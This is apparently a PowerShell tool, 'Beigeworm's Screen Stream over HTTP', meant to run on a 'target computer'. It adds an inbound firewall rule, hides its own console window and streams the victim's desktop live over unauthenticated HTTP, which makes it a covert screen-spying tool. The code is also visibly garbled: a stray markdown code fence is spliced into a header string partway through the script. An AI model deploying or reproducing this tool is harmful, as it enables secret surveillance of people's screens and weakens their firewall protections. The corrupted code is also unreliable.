<#
================================================= Beigeworm's Screen Stream over HTTP ==========================================================

SYNOPSIS
Start up a HTTP server and stream the desktop to a browser window on another device on the network.

USAGE
1. Run this script on the target computer and note the URL provided.
2. On another device on the same network, enter the provided URL in a browser window.
3. Hold the escape key on the target for 5 seconds to exit screenshare.

#>

# Hide the PowerShell console (1 = yes)
$hide = 1

[Console]::BackgroundColor = "Black"
Clear-Host
[Console]::SetWindowSize(88,30)
[Console]::Title = "HTTP Screenshare"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName PresentationCore,PresentationFramework
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Application]::EnableVisualStyles()

# Define port number
$port = 8080
Write-Host "Using port: $port" -ForegroundColor Green

Write-Host "Detecting primary network interface." -ForegroundColor DarkGray
$networkInterfaces = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.InterfaceDescription -notmatch 'Virtual' }
$filteredInterfaces = $networkInterfaces | Where-Object { $_.Name -match 'WLAN' -or $_.Name -match 'Ethernet' }
$primaryInterface = $filteredInterfaces | Select-Object -First 1

if ($primaryInterface) {
    if ($primaryInterface.Name -match 'WLAN') {
        Write-Output "Wi-Fi is the primary internet connection."
        $localIP = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "WLAN" | Select-Object -ExpandProperty IPAddress
    } elseif ($primaryInterface.Name -match 'Ethernet') {
        Write-Output "Ethernet is the primary internet connection."
        $localIP = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Ethernet" | Select-Object -ExpandProperty IPAddress
    } else {
        Write-Output "Unknown primary internet connection."
    }
} else {
    Write-Output "No primary internet connection found."
    exit
}

# Check if localIP is valid
if (-not $localIP) {
    Write-Host "No valid local IP address found. Exiting."
    exit
}

# Create firewall rule and start web server
New-NetFirewallRule -DisplayName "AllowWebServer" -Direction Inbound -Protocol TCP -LocalPort $port -Action Allow | Out-Null
$webServer = New-Object System.Net.HttpListener 
$webServer.Prefixes.Add("http://"+$localIP+":$port/")
$webServer.Prefixes.Add("http://localhost:$port/")
$webServer.Start()
Write-Host ("Network Devices Can Reach the server at : http://"+$localIP+":$port") 
Write-Host "Press escape key for 5 seconds to exit" -ForegroundColor Cyan
Write-Host "Hiding this window.." -ForegroundColor Yellow
Start-Sleep -Seconds 4

# Code to hide the console on Windows 10 and 11
if ($hide -eq 1) {
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
    
    if ($hwnd -ne [System.IntPtr]::Zero) {
        $Type::ShowWindowAsync($hwnd, 0)
    } else {
        $Host.UI.RawUI.WindowTitle = 'hideme'
        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
        $hwnd = $Proc.MainWindowHandle
        $Type::ShowWindowAsync($hwnd, 0)
    }
}

# Escape to exit key detection
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Keyboard
{
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@
$VK_ESCAPE = 0x1B
$startTime = $null

while ($true) {
    try {
        $context = $webServer.GetContext()
        $response = $context.Response
        if ($context.Request.RawUrl -eq "/stream") {
            $response.ContentType = "multipart/x-mixed-replace; boundary=frame"
            $response.Headers.Add(" ```powershell
Content-Disposition", "inline; filename=stream.jpg")
            $response.StatusCode = 200
            $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes("HTTP/1.1 200 OK`r`n"))
            $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes("Content-Type: multipart/x-mixed-replace; boundary=frame`r`n`r`n"))

            while ($true) {
                # Capture the screen and convert to JPEG
                $bitmap = New-Object System.Drawing.Bitmap -ArgumentList [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
                $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
                $memoryStream = New-Object System.IO.MemoryStream
                $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                $imageBytes = $memoryStream.ToArray()
                $memoryStream.Close()
                $bitmap.Dispose()
                $graphics.Dispose()

                # Send the image to the client
                $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes("--frame`r`n"))
                $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes("Content-Type: image/jpeg`r`n"))
                $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes("Content-Length: " + $imageBytes.Length + "`r`n`r`n"))
                $response.OutputStream.Write($imageBytes)
                $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes("`r`n"))
                $response.OutputStream.Flush()

                # Check for escape key press
                if ([Keyboard]::GetAsyncKeyState($VK_ESCAPE) -ne 0) {
                    Write-Host "Exiting screen share..."
                    break
                }
                Start-Sleep -Milliseconds 100
            }
        }
        $response.OutputStream.Close()
    } catch {
        Write-Host "Error: $_"
        break
    }
}

$webServer.Stop()
Write-Host "Web server stopped."
